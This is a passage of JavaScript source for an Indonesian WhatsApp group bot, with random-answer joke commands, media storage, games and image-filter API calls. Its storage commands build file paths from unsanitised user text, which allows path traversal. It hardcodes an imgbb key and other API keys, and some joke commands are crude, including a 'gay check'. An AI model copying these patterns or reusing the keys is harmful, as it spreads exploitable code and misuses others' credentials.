          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
      //------------------< Fitur Fun >-------------------
      //funmenu
                case "bisakah":
                  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                  if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw
              
					bisakah = args.join(" ")
					const bisa =['Bisa','Tidak Bisa','Hmmm gimana ya','Gak bisa ajg awoakwok','mana mungkin su','Bisa banget tuh, keren kayaknya']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "kapankah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                
					kapankah = args.join(" ")
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "apakah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					apakah = args.join(" ")
					const apa =['Iya','Tidak','Bisa Jadi','Hmmm gimana ya']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await limitAdd(sender)
					break
case "belah":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					// ⚠️ Case by Arasya
                 
				if (args.length < 1) return reply('mana pertanyaan nya kak?\nContoh #iyas bermain Free Fire')
					iyas = args.join(" ")
					const iya =['Bener','Salah','Bener dong','Salah!!!']
					const salah = iya[Math.floor(Math.random() * iya.length)]
					syaa.sendMessage(from, 'Pertanyaan : *bener atau salah '+iyas+'*\n\nJawaban : '+ salah, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "bagaimanakah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					bagaimanakah = args.join(" ")
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Hmmm gimana ya','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "rate":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					rate = args.join(" ")
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "sangecek":
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					// ⚠️ Case by DappaUhuy&YogPw
if (isBanned) return reply(mess.ban)
                 
					sange = args.join(" ")
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
case "gaycek":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw
              
					gayy = args.join(" ")
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
////CASE BY ARASYA YANG NYOLONG MATI:v
case "cekme":
  case "me":
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
  reply("Tunggu!, Sedang Scan Number & Name")
					// ⚠️ Case By Arasya
					neme = args.join(" ")
					bet = `${sender}`
					const sifat =['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
					const hoby =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const bukcin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const arp =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const cakep =['Iyaa cakep','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget😍','❌','✔️']
					const wetak=['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const baikk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bhuruk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const cerdhas =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const berhani =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const mengheikan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sipat = sifat[Math.floor(Math.random() * sifat.length)]
					const biho = hoby[Math.floor(Math.random() * hoby.length)]
					const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					const senga = arp[Math.floor(Math.random() * arp.length)]
					const chakep = cakep[Math.floor(Math.random() * cakep.length)]
					const watak = wetak[Math.floor(Math.random() * wetak.length)]
					const baik = baikk[Math.floor(Math.random() * baikk.length)]
					const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					const berani = berhani[Math.floor(Math.random() * berhani.length)]
					const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					try {
					profil = await syaa.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					profil = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					 profile = `${c}==== CEK @${bet.split('@')[0]} ====${c}

*Nama :* ${pushname}
*Sifat :* ${sipat}
*Hobby :* ${biho}
*Bucin :* ${bhucin}%
*Sange :* ${senga}%
*Cakep :* ${chakep}
*Watak :* ${watak}
*Akhlak Baik :* ${baik}%
*Akhlak Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Ketakutan :* ${takut}%
${c}=================${c}`
					buff = await getBuffer(profil)
					syaa.sendMessage(from, buff, image, {quoted: mek, caption: profile, contextInfo: { mentionedJid: [bet]}})
					break
////cewa
case 'sewa':
reply(`𝑺𝒆𝒘𝒂 𝑩𝒐𝒕 𝑱𝒐𝒋𝒐

============================
 ${c}PRICE LIST JOJO BOT${c}
- SATU TAHUN : Rp.45.000
- SATU BULAN : Rp.30.000
- SATU MINGGU : Rp.15.000
- SATU HARI : Rp.5.000
============================

KEGUNAAN :
- Meramaikan Group
- Download Audio/Video
- Bermain Game
- Akses Fitur Premium
- No Banned

*NOTE :* _Jika Anda Memainkan Bot Dan Memainkan Secara Ilegal, Akan Di Banned Selama 30 Hari_`)
break
////CASE BY ARASYA, YANG NYOLONG MATI!
/////////===============///////////////////////////CASE STORAGE!!///////////////
case 'addvideo':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				//Fix By M4N1K
          
					if (!isQuotedVideo) return reply('Reply videonya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama videonya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./strg/video/${svst}.mp4`, delb)
					fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: mek })
					break
					
				case 'getvideo':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/video/${namastc}.mp4`)
					syaa.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
					break
					
				case 'listvideo':
				case 'videolist':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				//Fix By M4N1K
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break
case 'getsticker':
				case 'gets': 
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				  
					namastc = body.slice(12)
					result = fs.readFileSync(`./strg/stiker/${namastc}.webp`)
					syaa.sendMessage(from, result, sticker, {quoted :mek})
					break
                case 'stickerlist':
				case 'liststicker': 
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
                case 'addsticker':
                case 'addstiker':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					if (!isQuotedSticker) return reply('Reply stiker nya')
					svst = body.slice(12)
					if (!svst) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./strg/stiker/${svst}.webp`, delb)
					fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
					syaa.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, { quoted: mek })
					break
case 'addvn': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					svst = body.slice(7)
					if (!svst) return reply('Nama audionya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./strg/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
					break
			
				case 'listvn':
				case 'vnlist': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
case 'getvn': 
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					namastc = body.slice(7)
					buffer = fs.readFileSync(`./strg/audio/${namastc}.mp3`)
					syaa.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					break
case 'addimage':
				//Fix By M4N1K
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					if (!isQuotedImage) return reply('Reply imagenya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama imagenya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
					break
					
				case 'getimage':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/image/${namastc}.jpeg`)
					syaa.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
					
				case 'imglist':
				case 'listimg':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				//Fix By M4N1K
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
////atm&limit
/*case 'transfer':
  
				if (!q.includes('|')) return  reply(ind.wrongf())
                const tujuan = q.substring(0, q.indexOf('|') - 1)
                const jumblah = q.substring(q.lastIndexOf('|') + 1)
                if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                if (jumblah < 100 ) return reply(`minimal transfer 100`)
                if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                fee = 0.005 *  jumblah
                hasiltf = jumblah - fee
                addKoinUser(tujuantf, hasiltf)
                confirmATM(sender, jumblah)
                addKoinUser('62895710073737@s.whatsapp.net', fee)
                reply(`*「 SUKSES 」*\n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : ${fee}`)
                break
case 'limit':
				// Fix Case By Yogi/Hans⛔
				checkLimit(sender)
				break
				case 'dompet':
				const kantong = checkATMuser(sender)
				reply(ind.uangkau(pushname, sender, kantong))
				break
				case 'buy':
				payout = body.slice(10)
				if(isNaN(payout)) return await reply(' harus berupa angka!!')
				const koinPer = 300
				const total = koinPer * payout
				if ( checkATMuser(sender) <= total) return reply(`maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= total ) {
					confirmATM(sender, total)
					bayar(sender, payout)
					await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*pengirim* : Admin\n*penerima* : ${pushname}\n*nominal pembelian* : ${payout} \n*harga * : ${koinPer}/\n*sisa uang mu* : ${checkATMuser(sender)}\n\nproses berhasil dengan nomer pembayaran\n${createSerial(15)}`)
				} 
				break*/
////slot2 by manik
case 'slot':
            case 'slots':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
              if (isBanned) return reply(mess.ban)
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            syaa.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy} <=====||\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            sendButMessage(from, `Mau main lagi?`, `Pencet tombol di bawah`, [
          {
            buttonId: `${prefix}slot`,
            buttonText: {
              displayText: `Play Again`,
            },
            type: 1,
          },
        ]);
            break;
///////Slot
/*TEST TOD NYA WISNUUUUU GES*/
case "tod":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					 var arasyagans =` ${pushname} mau yg truth or dare?\n\npilih tombol di bawah `
					sendButImage(from, arasyagans, "Case By @iamghosky_", thumb, [
          {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`
            },
            type: 1,
          },
 ]);
 break
/*TEST COMMAND*/
case 'afk':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned)return reply(mess.ban)
                    alasan = args.join(" ")
                    aefka[sender.split('@')[0]] = alasan.toLowerCase()
                    fs.writeFileSync("./database/afk.json", JSON.stringify(aefka))
                    ini_txt = `Kakak ${pushname} Sedang Afk `
                    if (alasan != "") {
                        ini_txt += `Dengan Alasan : ` + alasan
                    }
                    fakegroup(ini_txt)
                    break
case 'ttt':
        case 'tictactoe':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
          if (!isGroup) return reply("mainkan di group")
          if (args.length < 1) return reply ("tag orang yang mau kamu aja main")
          if (isTTT) return reply("permainan sedang berlangsung di group ini")
          if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag salah satu orang untuk di ajak bermain')
          ment = mek.message.extendedTextMessage.contextInfo.mentionedJid;
          player1 = `${sender}`
          player2 = ment[0]
          number = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
          id = from
          turn = player2
          roomttt.push({player1,player2,id,number,turn})
          syaa.sendMessage(from, `*[ 🎮GAME TICTACTOE🎮 ]*
 
${c}@${player1.split("@")[0]} Telah Memulai Game${c}
 
${c}Kak @${player2.split("@")[0]} Kamu Di Tantang Sama @${player1.split("@")[0]} Untuk Bermain Tictactoe${c}
${c}Ketik Y/N untuk menerima/menolak tantangan${c}
  
_ketik ${prefix}delttt untuk membatalkan permainan di group ini_`, text, {contextInfo: { mentionedJid: [player1, player2]}});
          break;
          case 'delttt':
          if (!isGroup) return reply("command ini hanya untuk group")
          if (!isTTT) return reply("tidak ada permainan yang sedang berlangsung")
          rooms = roomttt.filter(titid => titid.id.includes())
          roomttt = rooms;
          reply("Berhasil Menghapus Sesi Game Tictactoe")
          break;
///////////////////////////////A================\\\\\\\\\\\\aAKHR
case 'citacita':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']

              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              syaa.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: mek})
              break
///Case by rame
/*case 'cersex':
if (isBanned) return reply(mess.ban)
reply(mess.wait)
anu = await fetchJson(`https://hujanapi.herokuapp.com/api/cersex?apikey=trial2k21`) 
buffer = await getBuffer(anu.gambar) 
s3x = `*[ CERITA S3X ]*\n\n\nCerita : ${anu.result}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: s3x})
break
case 'kisahnabi':
        if (isBanned)return reply(mess.ban)
				reply(mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://hardianto-chan.herokuapp.com/api/muslim/kisahnabi?nabi=${query}&apikey=hardianto`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.kelahiran}\n`
                    ini_txt += `Wafat Pada Usia : ${get_result.wafat_usia}\n`
                    ini_txt += `Tempat : ${get_result.singgah}\n`
                    ini_txt += `Story : \n${get_result.kisah}`
                    reply(ini_txt)
                    break*/
case 'shortlink':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
				syaa.updatePresence(from, Presence.composing) 
				urlnya = body.slice(11)
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/cuttly?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
case 'wiki': case 'wikipedia':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
reply(mess.wait)
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_Error Hasil Tidak Ditemukan_') 
}) 
result = `*JUDUL :* ${res[0].judul}

*WIKI :* ${res[0].wiki}`
sendMediaURL(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
reply(result)
})
break
case 'spongebobm':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/spongebob?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'hengkerm':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker2?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'hengkerm2':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker3?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'ripm':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
